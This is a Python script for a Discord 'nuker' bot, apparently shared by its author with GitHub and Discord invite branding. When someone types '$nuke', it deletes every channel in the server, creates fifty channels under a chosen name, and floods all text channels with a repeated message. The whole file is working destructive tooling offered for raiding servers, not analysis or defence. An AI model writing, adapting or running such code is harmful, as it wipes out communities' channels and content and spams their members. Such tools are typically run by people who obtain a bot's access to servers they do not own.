import os
import asyncio
import discord
from discord.ext import commands, tasks
import colorama
from colorama import Fore
import ctypes
import time


intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True
intents.members = True
intents.messages = True
intents.voice_states = True
client = commands.Bot(command_prefix="$", intents=discord.Intents.all())


ctypes.windll.kernel32.SetConsoleTitleW("github.com/sgtfettsack")

print(Fore.LIGHTRED_EX + rf"""
        
              ____  ____  _   __
             / __ \/ __ )/ | / /
            / / / / __  /  |/ / 
           / /_/ / /_/ / /|  /  
          /_____/_____/_/ |_/   
                      
 
            {Fore.YELLOW}> {Fore.LIGHTYELLOW_EX}made by sgtfettsack {Fore.YELLOW}<
            {Fore.YELLOW}> {Fore.LIGHTYELLOW_EX}$nuke {Fore.YELLOW}<


""")


@client.event
async def on_ready():
    await client.tree.sync()
    print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] BOT STARTED.")
    print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] waiting for incoming command. $nuke")
    print()
    activity = discord.Activity(type=discord.ActivityType.listening, name="github.com/sgtfettsack")
    await client.change_presence(status=discord.Status.online, activity=activity)



@client.command()
async def nuke(ctx):   # $nuke to execute the discord bot nuker, OR replace "async def nuke(ctx)" with "async def YOUR-COMMAND(ctx)"
    print("CHECKOUT MY github.com/sgtfettsack AND discord.gg/f5jvwrYGSt !!!")
    ch_name = input(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] Enter channel name: ")
    message = input(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] Enter message: ")

    guild2 = ctx.message.guild
    if ch_name == None:
        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] You have to enter a name for the channels.")
    else:
        print()
        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] NUKE started.")
        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] Deleting all channels.")
        for c in ctx.guild.channels:
            await c.delete()
        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] Creating new channels.")
        for i in range(50):
            await guild2.create_text_channel(ch_name)
        
        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] Sending message to all text channels.")
        for i in range(50):
            if guild2:
                for channel in guild2.text_channels:
                    await channel.send(message)

        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] NUKE was successfull. Script will close in 5 seconds.")
        time.sleep(5)
        quit()


async def main():
    class TOKEN:
        bot_token = input(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] Enter BOT TOKEN: ")
    try:
        async with client:
            await client.start(TOKEN.bot_token)
    except:
        print(f"{Fore.WHITE}[{Fore.LIGHTRED_EX}*{Fore.WHITE}] BOT TOKEN INVALID... RESTARTING")
        time.sleep(3)
        os.system("cls")
        os.system("python token_nuker.py")
        quit()


asyncio.run(main())
